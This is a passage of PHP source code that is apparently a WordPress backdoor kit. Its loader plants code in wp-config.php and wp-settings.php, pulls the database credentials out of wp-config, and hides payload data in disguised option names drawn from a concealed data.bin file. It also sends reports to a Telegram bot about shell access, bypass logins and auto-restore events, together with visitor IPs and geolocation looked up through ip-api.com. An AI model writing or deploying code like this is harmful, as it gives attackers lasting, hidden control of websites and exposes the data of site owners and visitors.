    if(preg_match('/(require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\)\s*;)/i',$_c,$mm,PREG_OFFSET_CAPTURE)){
      $_c=substr($_c,0,$mm[0][1]).$_g.$mm[0][0].substr($_c,$mm[0][1]+strlen($mm[0][0]));
    }else{$_c=rtrim($_c)."\n".$_g;}
    @file_put_contents($_wc,$_c);
  }
}
$_s=$_r.'/wp-settings.php';
if(is_file($_s)&&is_writable($_s)){
  $_c=@file_get_contents($_s);
  if($_c!==false&&strpos($_c,$_m)===false){
    @file_put_contents($_s,rtrim($_c)."\n".@pack('H*','__SNIP_HEX__')."\n");
  }
}
$_bk=$_r.'/wp-content/upgrade/.wp-tmp/data.bin';
if(!is_file($_bk)||!class_exists('mysqli'))return;
$_wcc=@file_get_contents($_wc);
if(!$_wcc)return;
$_db=array();
foreach(array('DB_NAME','DB_USER','DB_PASSWORD','DB_HOST') as $_k){
  if(preg_match("/define\s*\(\s*['\"]".$_k."['\"]\s*,\s*['\"]([^'\"]*?)['\"]\s*\)/",$_wcc,$mm))$_db[$_k]=$mm[1];
}
if(empty($_db['DB_NAME'])||empty($_db['DB_USER']))return;
$_h=isset($_db['DB_HOST'])?$_db['DB_HOST']:'localhost';$_p=3306;$_sk='';
if(strpos($_h,':')!==false){$_hp=explode(':',$_h,2);$_h=$_hp[0];if(is_numeric($_hp[1]))$_p=(int)$_hp[1];else $_sk=$_hp[1];}
$_cn=@new mysqli($_h,$_db['DB_USER'],isset($_db['DB_PASSWORD'])?$_db['DB_PASSWORD']:'',$_db['DB_NAME'],$_p,$_sk);
if($_cn->connect_error)return;
$_cn->set_charset('utf8mb4');
$_pfx='wp_';
if(preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/',$_wcc,$mm))$_pfx=$mm[1];
$_tb=$_pfx.'options';
$_rs=@$_cn->query("SELECT option_value FROM `$_tb` WHERE option_name='$_m' LIMIT 1");
$_lv='';
if($_rs&&$_rs->num_rows>0){$_rw=$_rs->fetch_assoc();$_lv=$_rw['option_value'];}
if(strlen($_lv)>=200){$_cn->close();return;}
$_raw=@file_get_contents($_bk);
if(!$_raw||!ctype_xdigit(trim($_raw))){$_cn->close();return;}
$_d=@json_decode(@gzinflate(@pack('H*',trim($_raw))),true);
if(!$_d||!isset($_d['l'])){$_cn->close();return;}
$_map=array('l'=>$_m,'s'=>'wp_theme_data_cache','c'=>'wp_feed_parser_settings','n'=>'wp_browser_compat_check');
foreach($_map as $_k=>$_on){
  if(!isset($_d[$_k]))continue;
  $_v=$_cn->real_escape_string($_d[$_k]);
  @$_cn->query("DELETE FROM `$_tb` WHERE option_name='$_on'");
  @$_cn->query("INSERT INTO `$_tb` (option_name,option_value,autoload) VALUES ('$_on','$_v','no')");
}
$_cn->close();
LOADER;
}

// ── HELPERS ──
function _tsc_strip_tags($c){
  if(strpos($c,'<?php')===0)$c=substr($c,5);
  elseif(strpos($c,'<?')===0)$c=substr($c,2);
  $c=rtrim($c);
  if(substr($c,-2)==='?>')$c=substr($c,0,-2);
  return $c;
}

function _tsc_http($url,$post=null){
  $r=false;
  if($post){$ctx=@stream_context_create(array('http'=>array('method'=>'POST','header'=>'Content-Type: application/x-www-form-urlencoded','content'=>http_build_query($post),'timeout'=>5,'ignore_errors'=>true)));$r=@file_get_contents($url,false,$ctx);}
  else{$r=@file_get_contents($url);}
  if($r===false&&function_exists('curl_init')){
    $ch=curl_init($url);curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_FOLLOWLOCATION=>true));
    if($post){curl_setopt($ch,CURLOPT_POST,true);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($post));}
    $r=curl_exec($ch);curl_close($ch);
  }
  return $r;
}

function _tsc_fetch_url($url){
  $r=@file_get_contents($url);
  if($r===false&&function_exists('curl_init')){
    $ch=curl_init($url);curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>15,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_USERAGENT=>'Mozilla/5.0'));
    $r=curl_exec($ch);curl_close($ch);
  }
  return $r;
}

// ── TELEGRAM REPORT ──
function _tsc_report($cfg,$type,$detail){
  if(!$cfg||!isset($cfg['bot_token'])||!isset($cfg['chat_id']))return;
  $_no_flood=array('shell_access','invalid_nonce','auto_restore','nonce_regenerated','error');
  if(in_array($type,$_no_flood)){
    $_rk='_tsc_rate_'.md5($type.(isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:''));
    if(function_exists('get_transient')&&get_transient($_rk))return;
    if(function_exists('set_transient'))set_transient($_rk,1,600);
  }
  $icons=array('shell_access'=>"\xF0\x9F\x94\x93",'invalid_nonce'=>"\xE2\x9D\x8C",'wp_bypass'=>"\xF0\x9F\x94\x91",'wp_login_fail'=>"\xF0\x9F\x9A\xAB",'wp_login_ok'=>"\xE2\x9C\x85",'brute_blocked'=>"\xF0\x9F\x9B\x91",'auto_restore'=>"\xE2\x9A\xA0\xEF\xB8\x8F",'restore_fail'=>"\xF0\x9F\x86\x98",'inject_restored'=>"\xF0\x9F\x94\xA7",'nonce_regenerated'=>"\xF0\x9F\x94\x84",'installed'=>"\xF0\x9F\x86\x95",'error'=>"\xF0\x9F\x92\xA5");
  $icon=isset($icons[$type])?$icons[$type]:"\xF0\x9F\x93\x8B";
  $domain=isset($cfg['domain'])?$cfg['domain']:(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'unknown');
  $ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'?';
  $ua=isset($_SERVER['HTTP_USER_AGENT'])?substr($_SERVER['HTTP_USER_AGENT'],0,80):'?';
  $geo_str='';
  $geo=@json_decode(@_tsc_http('http://ip-api.com/json/'.$ip.'?fields=country,city,regionName,isp&lang=en'),true);
  if($geo&&isset($geo['country'])){
    $geo_str=($geo['city']?$geo['city'].', ':'').($geo['regionName']?$geo['regionName'].', ':'').$geo['country'];
    if(isset($geo['isp'])&&$geo['isp'])$geo_str.="\n\xF0\x9F\x8F\xA2 ".$geo['isp'];
  }
  $labels=array('shell_access'=>'SHELL ACCESS','invalid_nonce'=>'NONCE INVALID','wp_bypass'=>'WP BYPASS LOGIN','wp_login_fail'=>'WP LOGIN GAGAL','wp_login_ok'=>'WP LOGIN BERHASIL','brute_blocked'=>'BRUTE FORCE BLOCKED','auto_restore'=>'AUTO RESTORE','restore_fail'=>'RESTORE GAGAL','inject_restored'=>'INJECT RESTORED','nonce_regenerated'=>'NONCE BARU','installed'=>'INSTALL BARU','error'=>'ERROR');
  $label=isset($labels[$type])?$labels[$type]:strtoupper($type);
  $text=$icon.' <b>'.$label."</b> [WP]\n".str_repeat("\xE2\x94\x80",20)."\n";
  $text.="\xF0\x9F\x8C\x90 ".$domain."\n";
  $text.="\xF0\x9F\x93\x9D ".$detail."\n";
  $text.="\xF0\x9F\x92\xBB IP: <code>".$ip."</code>\n";
  if($geo_str)$text.="\xF0\x9F\x93\x8D ".$geo_str."\n";
  $text.="\xF0\x9F\x95\x90 ".date("Y-m-d H:i:s")."\n";
  if(in_array($type,array('invalid_nonce','shell_access','wp_bypass','wp_login_fail','wp_login_ok')))$text.="\xF0\x9F\x94\x8D UA: ".$ua."\n";
  _tsc_http("https://api.telegram.org/bot".$cfg['bot_token']."/sendMessage",array('chat_id'=>$cfg['chat_id'],'text'=>$text,'parse_mode'=>'HTML','disable_web_page_preview'=>true));
}
